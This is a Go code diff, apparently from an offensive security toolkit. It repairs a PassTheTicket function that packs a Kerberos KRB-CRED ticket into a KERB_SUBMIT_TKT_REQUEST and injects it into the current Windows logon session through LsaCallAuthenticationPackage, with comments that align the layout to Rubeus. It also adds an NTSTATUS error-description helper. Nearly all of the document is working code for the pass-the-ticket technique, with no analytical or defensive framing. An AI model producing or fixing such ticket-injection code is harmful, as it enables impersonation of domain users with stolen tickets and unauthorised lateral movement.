@@ -111,31 +111,35 @@ func PassTheTicket(kirbi *ticket.Kirbi) error {
 	}
 
 	// Build submit request
-	// KERB_SUBMIT_TKT_REQUEST structure:
-	//   MessageType: KERB_SUBMIT_TKT_REQUEST (21)
-	//   LogonId: LUID (8 bytes, 0 = current)
-	//   Flags: 0
-	//   Key: KERB_CRYPTO_KEY (optional, for KrbCred)
+	// KERB_SUBMIT_TKT_REQUEST structure (matches Rubeus exactly):
+	//   MessageType: KERB_PROTOCOL_MESSAGE_TYPE (4 bytes)
+	//   LogonId: LUID (8 bytes)
+	//   Flags: int32 (4 bytes)
+	//   Key: KERB_CRYPTO_KEY32 (12 bytes) - left as zeros, key is in KRB-CRED
 	//     - KeyType: int32
 	//     - Length: int32
-	//     - Value: ptr
-	//   KerbCredSize: int32
-	//   KerbCredOffset: int32
+	//     - Offset: int32
+	//   KerbCredSize: int32 (4 bytes)
+	//   KerbCredOffset: int32 (4 bytes)
+	// Total header: 36 bytes
 
-	requestSize := 4 + 8 + 4 + 12 + 4 + 4 + len(ticketBytes)
+	headerSize := 36
+	requestSize := headerSize + len(ticketBytes)
 	request := make([]byte, requestSize)
 
-	// MessageType
-	request[0] = byte(KerbSubmitTicketMessage)
+	// MessageType = KerbSubmitTicketMessage (21)
+	*(*int32)(unsafe.Pointer(&request[0])) = int32(KerbSubmitTicketMessage)
 	// LogonId = 0 (current session) - bytes 4-11
 	// Flags = 0 - bytes 12-15
-	// Key = empty (KeyType=0, Length=0) - bytes 16-27
+	// Key = zeros (KeyType=0, Length=0, Offset=0) - bytes 16-27
+	// The session key is contained in the KRB-CRED enc-part, not passed separately
+
 	// KerbCredSize
 	*(*int32)(unsafe.Pointer(&request[28])) = int32(len(ticketBytes))
-	// KerbCredOffset - right after the header
-	*(*int32)(unsafe.Pointer(&request[32])) = 36
+	// KerbCredOffset - right after the header (same as Rubeus: Marshal.SizeOf(KERB_SUBMIT_TKT_REQUEST))
+	*(*int32)(unsafe.Pointer(&request[32])) = int32(headerSize)
 	// Copy ticket data
-	copy(request[36:], ticketBytes)
+	copy(request[headerSize:], ticketBytes)
 
 	// Call LSA
 	var response unsafe.Pointer
@@ -157,10 +161,13 @@ func PassTheTicket(kirbi *ticket.Kirbi) error {
 	}
 
 	if ret != 0 {
-		return fmt.Errorf("LsaCallAuthenticationPackage failed: 0x%x", ret)
+		return fmt.Errorf("LsaCallAuthenticationPackage failed: 0x%08X", uint32(ret))
 	}
 	if protocolStatus != 0 {
-		return fmt.Errorf("Kerberos returned error: 0x%x", protocolStatus)
+		// Convert to unsigned for proper hex display
+		status := uint32(protocolStatus)
+		errDesc := describeNTStatus(status)
+		return fmt.Errorf("Kerberos returned error: 0x%08X (%s)", status, errDesc)
 	}
 
 	return nil
@@ -249,4 +256,39 @@ func encodeUTF16ptt(s string) []byte {
 		result[i*2+1] = byte(r >> 8)
 	}
 	return result
+}
+
+// describeNTStatus returns a human-readable description for common error codes
+func describeNTStatus(status uint32) string {
+	switch status {
+	case 0x0000006E:
+		return "KDC_ERR_CLIENT_REVOKED"
+	case 0x00000096:
+		return "KDC_ERR_REVOKED"
+	case 0xC000006D:
+		return "STATUS_LOGON_FAILURE"
+	case 0xC0000022:
+		return "STATUS_ACCESS_DENIED"
+	case 0xC000009A:
+		return "STATUS_INSUFFICIENT_RESOURCES"
+	case 0xC0000064:
+		return "STATUS_NO_SUCH_USER"
+	case 0xC00000BB:
+		return "STATUS_NOT_SUPPORTED"
+	case 0xC0000098:
+		return "STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT"
+	case 0xC0000234:
+		return "STATUS_ACCOUNT_LOCKED_OUT"
+	case 0xC000005E:
+		return "STATUS_NO_LOGON_SERVERS"
+	case 0xC0000380:
+		return "STATUS_SMARTCARD_SUBSYSTEM_FAILURE"
+	case 0xC0000388:
+		return "STATUS_DOWNGRADE_DETECTED"
+	default:
+		if status >= 0x40000000 && status < 0x80000000 {
+			return "KERB_ERROR"
+		}
+		return "UNKNOWN"
+	}
 }
